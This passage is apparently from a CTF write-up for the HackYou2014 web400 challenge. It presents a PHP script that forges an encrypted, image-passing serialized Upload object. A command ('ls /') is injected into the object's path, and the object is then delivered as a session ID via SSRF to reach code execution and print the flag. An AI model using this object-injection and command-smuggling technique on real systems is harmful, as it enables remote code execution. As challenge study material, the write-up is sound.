+<p>Also, if we want to obtain our exploit &ldquo;image&rdquo; hash to craft the PHPSESSIONID, we need our exploit to have &ldquo;$this-&gt;type &gt; 0&rdquo; and for that we need <strong>exif_imagetype()</strong> to return a value bigger than 0. So our exploit will be generated with the following script that will run &ldquo;ls /&rdquo; when the Upload instance is destroyed. PHP 5 introduced a destructor concept similar to that of other object-oriented languages, such as C++. The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence.</p>
+
+<pre><code class="language-lang-php">class Upload {
+    function __construct($path) {
+        $this-&gt;data = &quot;&quot;;
+        $this-&gt;filename = &quot;&quot;;
+        $this-&gt;path = $path;
+        $this-&gt;type = &quot;image/jpeg&quot;;
+    }
+}
+
+function encrypt($data) {
+        $size = 32;
+        $key = '6hQJMFh8gRje67EmpDX3';
+        $iv = mcrypt_create_iv($size, MCRYPT_RAND);
+        $key = hash('sha256', $key, true);
+        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
+        return $data;
+}
+
+$upload = new Upload(&quot;img; ls /&quot;);
+$payload = 'auth|'.serialize($upload);
+$data = '';
+$file = 0;
+while (true){
+    echo '.';
+    $data = encrypt($payload);
+    file_put_contents(&quot;exploit&quot;,$data);
+    $file = exif_imagetype('exploit');
+    if($file &gt; 0){
+        echo $file.&quot;\n&quot;;
+        die(&quot;Done\n&quot;);
+    };
+};
+</code></pre>
+
+<p>Now our exploit will be accepted:</p>
+
+<p><img src="/images/octopress/web400-3.png" alt="" /></p>
+
+<p>All we are left to do is use our SSRF vector to visit the admin.php page for us and make it set the PHPSESSIONID in the query parameter:</p>
+
+<p><img src="/images/octopress/web400-4.png" alt="" /></p>
+
+<p>If we decode the response:</p>
+
+<p><img src="/images/octopress/web400-5.png" alt="" /></p>
+
+<p>The flag was:</p>
+
+<pre><code class="language-lang-bash">CTF{42a38432d46b9054004a7a87fd3140c7}
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/xxe"><span class="tag">XXE</span></a></li>
+        
+          <li><a href="/tags/rce"><span class="tag">RCE</span></a></li>
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/php"><span class="tag">PHP</span></a></li>
+        
+          <li><a href="/tags/hackyou2014"><span class="tag">HackYou2014</span></a></li>
+        
+          <li><a href="/tags/ssrf"><span class="tag">SSRF</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2106</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
